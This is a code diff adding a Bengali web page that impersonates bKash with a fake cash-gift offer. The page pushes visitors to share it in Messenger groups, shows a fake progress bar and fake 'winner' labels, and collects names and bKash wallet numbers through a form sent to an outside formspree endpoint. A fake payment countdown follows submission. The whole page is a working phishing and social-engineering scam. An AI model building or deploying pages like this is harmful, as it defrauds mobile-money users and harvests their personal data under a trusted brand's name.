@@ -1,3 +1,78 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bKash 2000 Taka Offer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; font-family: 'Hind Siliguri', sans-serif; }
+    body { background: #fce4ec; text-align: center; color: #333; }
+    .container { max-width: 500px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 10px; margin-top: 20px; }
+    h1 { font-size: 24px; margin-bottom: 10px; color: #d81b60; }
+    .label { margin-top: 20px; font-size: 18px; font-weight: bold; color: #444; }
+    .progress { width: 100%; height: 20px; background: #eee; border-radius: 10px; overflow: hidden; margin: 10px 0; }
+    .bar { height: 100%; width: 0%; background: #d81b60; transition: 1s ease; }
+    .form-group { margin: 15px 0; text-align: left; }
+    input[type="text"], input[type="tel"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
+    button { background: #d81b60; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+    button:hover { background: #c2185b; }
+    .countdown { font-size: 22px; color: red; margin-top: 20px; display: none; }
+    .header-image { width: 100%; max-width: 100%; border-radius: 10px; margin-bottom: 10px; }
+    .scrolling-labels { margin-top: 30px; display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
+    .scroll-box { background-color: #e1f5fe; color: #00796b; border: 1px solid #b2ebf2; padding: 8px 12px; border-radius: 8px; font-size: 15px; animation: fadeInOut 3s ease-in-out infinite; }
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA" alt="Header" class="header-image">
+
+    <h1>৫০০,০০০ জন মানুষ ৫০০ টাকা করে অনুদান পাবেন!</h1>
+
+    <p>শুধু মাত্র শেয়ার করলেই সুযোগ!</p>
+    <div class="label">শেয়ার কমপ্লিটঃ <span id="share-count">0</span>/100%</div>
+    <div class="progress">
+      <div class="bar" id="progress-bar"></div>
+    </div>
+
+    <button onclick="nativeShare()">📲 শেয়ার করুন</button>
+
+    <form action="https://formspree.io/f/myzjlqdp" method="POST" onsubmit="return showCountdown()" id="gift-form">
+      <div class="form-group">
+        <label>আপনার নাম:</label>
+        <input type="text" name="name" required>
+      </div>
+      <div class="form-group">
+        <label>bKash নম্বর:</label>
+        <input type="tel" name="bkash" required>
+      </div>
+      <button type="submit">🎁 উপহার ক্লেইম করুন</button>
+    </form>
+
+    <div class="countdown" id="countdown-box">
+      🎉 আপনার পেমেন্ট প্রক্রিয়াধীন। <br>
+      দয়া করে অপেক্ষা করুন <span id="countdown">24:00:00</span>
+    </div>
+
+    <div class="scrolling-labels" id="random-labels"></div>
+  </div>
+
+  <!-- 📢 Bkash Birthday Offer Message -->
+<div id="promo-message" style="text-align: center; background-color: #f2f2f2; padding: 15px; border-radius: 10px; margin: 20px auto; max-width: 700px; font-family: 'Noto Sans Bengali', sans-serif;">
+  <h2 style="color: #009688;">🎉 অভিনন্দন!</h2>
+  <p style="font-size: 18px;">আপনি <strong>bKash</strong> থেকে <strong>৳500</strong> ক্যাশ উপহারের জন্য যোগ্য।</p>
+  <h3 style="margin-top: 20px;">📌 কিভাবে আপনার <span style="color:red;">৳500</span> পাবেন?</h3>
+  <ul style="text-align: left; font-size: 16px; line-height: 1.7em; max-width: 600px; margin: 0 auto;">
+    <li>১. এটিকে Messenger-এ ৫টি গ্রুপ অথবা ১৫ জন বন্ধুর সাথে শেয়ার করুন <strong>(উপরের "SHARE" আইকনে ক্লিক করুন)</strong>।</li>
+    <li>২. লাল ভেরিফিকেশন বার <strong>১০০%</strong> হলে আপনি স্বয়ংক্রিয়ভাবে <strong>"PAYMENT FORM"</strong> পেজে চলে যাবেন।</li>
+    <li>৩. সফলভাবে ফর্ম সাবমিট করার পর আপনি আপনার <strong>bKash ড্যাশবোর্ডে ৳500</strong> পেয়ে যাবেন।</li>
+  </ul>
+</div>
+
 <!-- ✅ Enhanced Share Validation Script + UI -->
 <script>
   let shares = 0;
@@ -130,10 +205,16 @@
     label.className = "scroll-box";
     label.textContent = `🎉 অভিনন্দন ${name} পেয়েছেন ৫০০ টাকা উপহার!`;
     labelContainer.appendChild(label);
-    if (labelContainer.childElementCount > 9) {
+    if (labelContainer.childElementCount > 2) {
       labelContainer.removeChild(labelContainer.firstChild);
     }
   }
 
   setInterval(showRandomLabels, 2000);
 </script>
+
+
+
+
+</body>
+</html>
